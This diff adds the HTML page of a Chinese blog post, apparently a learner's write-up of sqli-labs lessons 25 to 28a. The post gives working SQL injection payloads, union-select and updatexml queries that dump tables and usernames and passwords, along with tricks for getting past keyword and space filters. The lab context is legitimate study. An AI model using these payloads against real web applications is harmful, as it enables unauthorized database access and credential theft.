@@ -1,0 +1,539 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="Less-25很明显，or,and,被过滤了。首先正常输入，?id&#x3D;1&#39;报错了，发现为注入点。这里要了解一个双写绕过注入：**or改成oorr，and改成anandd **思路：要先判断是一次性绕过还是非一次性过滤，如果是一次性就用双写绕过，如果是非一次性考虑其它变形。eg：大小写变形绕过OR&#x3D;oR&#x3D;Or&#x3D;or    利用运算符or&#x3D;|| ,and&#x3D;&amp;&amp;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sqli-labs25~28">
+<meta property="og:url" content="http://example.com/2020/12/10/sqli-labs/25/index.html">
+<meta property="og:site_name" content="WJW&#39;s Blog">
+<meta property="og:description" content="Less-25很明显，or,and,被过滤了。首先正常输入，?id&#x3D;1&#39;报错了，发现为注入点。这里要了解一个双写绕过注入：**or改成oorr，and改成anandd **思路：要先判断是一次性绕过还是非一次性过滤，如果是一次性就用双写绕过，如果是非一次性考虑其它变形。eg：大小写变形绕过OR&#x3D;oR&#x3D;Or&#x3D;or    利用运算符or&#x3D;|| ,and&#x3D;&amp;&amp;">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2020/12/10/sqli-labs/25/25.md/0.png">
+<meta property="og:image" content="http://example.com/2020/12/10/sqli-labs/25/25.md/1.png">
+<meta property="og:image" content="http://example.com/2020/12/10/sqli-labs/25/25.md/2.png">
+<meta property="og:image" content="http://example.com/2020/12/10/sqli-labs/25/25.md/3.png">
+<meta property="og:image" content="http://example.com/2020/12/10/sqli-labs/25/25.md/4.png">
+<meta property="og:image" content="http://example.com/2020/12/10/sqli-labs/25/25.md/5.png">
+<meta property="og:image" content="http://example.com/2020/12/10/sqli-labs/25/25.md/6.png">
+<meta property="og:image" content="http://example.com/2020/12/10/sqli-labs/25/25.md/7.png">
+<meta property="og:image" content="http://example.com/2020/12/10/sqli-labs/25/25.md/8.png">
+<meta property="article:published_time" content="2020-12-10T08:31:55.000Z">
+<meta property="article:modified_time" content="2021-05-23T01:35:18.000Z">
+<meta property="article:author" content="WJW">
+<meta property="article:tag" content="SQL注入">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2020/12/10/sqli-labs/25/25.md/0.png">
+
+<link rel="canonical" href="http://example.com/2020/12/10/sqli-labs/25/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>sqli-labs25~28 | WJW's Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="WJW's Blog" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">WJW's Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">14</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">0</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">62</span></a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2020/12/10/sqli-labs/25/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/cat.jpg">
+      <meta itemprop="name" content="WJW">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="WJW's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          sqli-labs25~28
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-12-10 16:31:55" itemprop="dateCreated datePublished" datetime="2020-12-10T16:31:55+08:00">2020-12-10</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-05-23 09:35:18" itemprop="dateModified" datetime="2021-05-23T09:35:18+08:00">2021-05-23</time>
+              </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>2.3k</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h3 id="Less-25"><a href="#Less-25" class="headerlink" title="Less-25"></a>Less-25</h3><p>很明显，or,and,被过滤了。<br>首先正常输入，<code>?id=1&#39;</code>报错了，发现为注入点。<br>这里要了解一个双写绕过注入：**or改成oorr，and改成anandd **<br>思路：要先判断是一次性绕过还是非一次性过滤，如果是一次性就用双写绕过，如果是非一次性考虑其它变形。<br>eg：大小写变形绕过OR=oR=Or=or<br>    利用运算符or=|| ,and=&amp;&amp;<br>            URL编码绕过:#=%23<br>    Hex编码:~=0x7e<br>    添加注释:/<em>or</em>/还有其他等等。<br>所以使用联合查询注入：<code>?id=-1&#39; union select 1,2,group_concat(username,passwoorrd)from users--+</code><br><img src="25.md/0.png"><br>还能使用报错注入，这里使用&amp;&amp;会报错。(原因？？)<br><code>?id=-1&#39; || updatexml(1,concat(0x7c,database()),1)--+</code><br><img src="25.md/1.png"><br>布尔盲注等等。。。</p>
+<h3 id="Less-25a"><a href="#Less-25a" class="headerlink" title="Less-25a"></a>Less-25a</h3><p>查看源码，sql语句为数字型注入，与第二关一样类型，再用和25关一样即可。<br>但是不能用报错注入，被注释了。</p>
+<h3 id="Less-26"><a href="#Less-26" class="headerlink" title="Less-26"></a>Less-26</h3><p>首先判断注入点，为?id=1’再查看源代码，这里过滤掉了很多东西。<br>过滤了# or and 多行单行注释 斜杠 空格 反斜杠。<br>所以就要找其他的来代替空格注释？？？<br>空格URL编码替代方法：%a0(空格),%0a(新建一行),%0b(TAB垂直),%0c(新的一页),%0d(return功能),%09(TAB水平)<br>尝试了联合注入，不知道为什么一直不行，尝试报错注入就可以。？？？<br>爆表<br><code>?id=0&#39;||updatexml(1,concat(0x7c,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=&#39;security&#39;))),0)||&#39;1&#39;=&#39;1</code><br>这里用updatexml可以省去空格过滤得烦恼。记得加0x7c，不然有一个表会被吃掉<br><strong>这里还通过加()方式省去了打空格。</strong>减少错误的发生<br><img src="25.md/2.png"><br>爆用户名和密码<br><code>?id=0&#39;||updatexml(1,concat(0x7c,(select(group_concat(username,passwoorrd))from(users))),0)||&#39;1&#39;=&#39;1</code><br><img src="25.md/3.png"><br>这里如果把||改成anandd也不行.?对于报错原理还是不太行。</p>
+<h4 id="PHP版本问题"><a href="#PHP版本问题" class="headerlink" title="PHP版本问题"></a>PHP版本问题</h4><p>因为版本问题，我输入的URL编码代替空格都会出现错误。这里把PHP版本换成5.2.17比较旧的版本。<br>就可以使用联合查询注入了，哈哈哈研究半天。。。不过也只有%0b、%a0可以用。</p>
+<h3 id="Less-26a"><a href="#Less-26a" class="headerlink" title="Less-26a"></a>Less-26a</h3><p>换成’)即可，记得后面条件闭合语句也要改成(‘1’)=(‘1来进行闭合。<br>列举一个：<br><code>?id=&#39;)union%0bselect%0b1,group_concat(username,passwoorrd),3%0bfrom%0busers%0bwhere%0b(&#39;9&#39;)=(&#39;9</code><br><strong>还有这里输入?id=-1没有正确回显，让id=null(空值)如：?id=-100也可以。借此还可以查有几个用户，或者0才有正确回显，但是为什么？</strong><br><img src="25.md/4.png"></p>
+<h3 id="Less-27"><a href="#Less-27" class="headerlink" title="Less-27"></a>Less-27</h3><p>从题目知道union、select被过滤了<br>查看源码：在26关基础上多过滤了union和select但是and，or这次没被过滤了。<br>尝试注入点：?id=1’报错，为单引号闭合型。</p>
+<p><strong>这边order by语句一直报错？回看23关有解释。</strong></p>
+<h4 id="直接查注入点"><a href="#直接查注入点" class="headerlink" title="直接查注入点"></a>直接查注入点</h4><p><code>?id=-100&#39;UnION%0bSElEct%0b1,2,3%0b||&#39;1&#39;=&#39;1</code><br><img src="25.md/5.png"><br>成功，还是要在字段2进行注入。字段一已经被1代替。</p>
+<h4 id="查数据库"><a href="#查数据库" class="headerlink" title="查数据库"></a>查数据库</h4><p><code>?id=-100&#39;UnION%0bSElEct%0b1,database(),3%0b||&#39;1&#39;=&#39;1</code><br><img src="25.md/6.png"></p>
+<h4 id="直接查用户名和密码"><a href="#直接查用户名和密码" class="headerlink" title="直接查用户名和密码"></a>直接查用户名和密码</h4><p><code>?id=-100&#39;UnION%0bSElEct%0b1,group_concat(username,&#39;-&#39;,password),3%0bfrom%0busers%0bwhere%0b&#39;1&#39;=&#39;1</code><br><img src="25.md/7.png"><br>使用第23关类似，直接用3闭合,也是可以的，更好。<br><code>?id=-15&#39;%0bUnIoN%0bsElEct%0b1,(sElEct%0bgroup_concat(concat(username,password))from%0busers),&#39;3</code><br><img src="25.md/8.png"><br>这里强调一下：<strong>记得用函数group_concat,它能够让返回的数据在一行，如果没用，会出现长度过长，数据爆不出来。</strong></p>
+<h3 id="Less-27a"><a href="#Less-27a" class="headerlink" title="Less-27a"></a>Less-27a</h3><p>改成双引号即可。</p>
+<h3 id="Less-28、28a"><a href="#Less-28、28a" class="headerlink" title="Less-28、28a"></a>Less-28、28a</h3><p>改成’)闭合就行，不过这里的?id=null跟26一样。<br>举个例子把:<br><code>?id=-15&#39;)UniOn%0b%0bSelEct%0b1,group_concat(username,password),3%0bfrom%0busers%0bwhere(&#39;1&#39;)=(&#39;1</code><br>还有简便方法：<br><code>?id=-15&#39;)%0BuNiOn%0BsElEct%0B1,(sEleCT%0bgroup_concat(username,password)from%0busers),(&#39;3</code></p>
+<h3 id="Less-28a：这里跟28差不多，但是这里的-id-1不用是null？"><a href="#Less-28a：这里跟28差不多，但是这里的-id-1不用是null？" class="headerlink" title="Less-28a：这里跟28差不多，但是这里的?id=-1不用是null？"></a>Less-28a：这里跟28差不多，但是这里的?id=-1不用是null？</h3>
+    </div>
+
+    
+    
+    
+<div>
+  
+    <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+  
+</div>
+        <div class="reward-container">
+  <div></div>
+  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    打赏
+  </button>
+  <div id="qr" style="display: none;">
+      
+      <div style="display: inline-block;">
+        <img src="/images/wechatpay.jpg" alt="WJW 微信支付">
+        <p>微信支付</p>
+      </div>
+      
+      <div style="display: inline-block;">
+        <img src="/images/alipay.jpg" alt="WJW 支付宝">
+        <p>支付宝</p>
+      </div>
+
+  </div>
+</div>
+
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>WJW
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://example.com/2020/12/10/sqli-labs/25/" title="sqli-labs25~28">http://example.com/2020/12/10/sqli-labs/25/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+        
+
+  <div class="followme">
+    <p>欢迎关注我的其它发布渠道</p>
+
+    <div class="social-list">
+
+        <div class="social-item">
+          <a target="_blank" class="social-link" href="/atom.xml">
+            <span class="icon">
+              <i class="fa fa-rss"></i>
+            </span>
+
+            <span class="label">RSS</span>
+          </a>
+        </div>
+    </div>
+  </div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag"># SQL注入</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/12/10/sqli-labs/24/" rel="prev" title="sqli-labs24">
+      <i class="fa fa-chevron-left"></i> sqli-labs24
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2020/12/12/sqli-labs/29/" rel="next" title="sqli-labs29~31">
+      sqli-labs29~31 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-25"><span class="nav-number">1.</span> <span class="nav-text">Less-25</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-25a"><span class="nav-number">2.</span> <span class="nav-text">Less-25a</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-26"><span class="nav-number">3.</span> <span class="nav-text">Less-26</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#PHP%E7%89%88%E6%9C%AC%E9%97%AE%E9%A2%98"><span class="nav-number">3.1.</span> <span class="nav-text">PHP版本问题</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-26a"><span class="nav-number">4.</span> <span class="nav-text">Less-26a</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-27"><span class="nav-number">5.</span> <span class="nav-text">Less-27</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9B%B4%E6%8E%A5%E6%9F%A5%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="nav-number">5.1.</span> <span class="nav-text">直接查注入点</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9F%A5%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="nav-number">5.2.</span> <span class="nav-text">查数据库</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9B%B4%E6%8E%A5%E6%9F%A5%E7%94%A8%E6%88%B7%E5%90%8D%E5%92%8C%E5%AF%86%E7%A0%81"><span class="nav-number">5.3.</span> <span class="nav-text">直接查用户名和密码</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-27a"><span class="nav-number">6.</span> <span class="nav-text">Less-27a</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-28%E3%80%8128a"><span class="nav-number">7.</span> <span class="nav-text">Less-28、28a</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-28a%EF%BC%9A%E8%BF%99%E9%87%8C%E8%B7%9F28%E5%B7%AE%E4%B8%8D%E5%A4%9A%EF%BC%8C%E4%BD%86%E6%98%AF%E8%BF%99%E9%87%8C%E7%9A%84-id-1%E4%B8%8D%E7%94%A8%E6%98%AFnull%EF%BC%9F"><span class="nav-number">8.</span> <span class="nav-text">Less-28a：这里跟28差不多，但是这里的?id&#x3D;-1不用是null？</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="WJW"
+      src="/images/cat.jpg">
+  <p class="site-author-name" itemprop="name">WJW</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">62</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">14</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="cc-license motion-element" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2020 – 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">WJW</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+      <span class="post-meta-item-text">站点总字数：</span>
+    <span title="站点总字数">236k</span>
+</div>
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false});</script></body>
+</html>
+<!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/src/clicklove.js"></script>
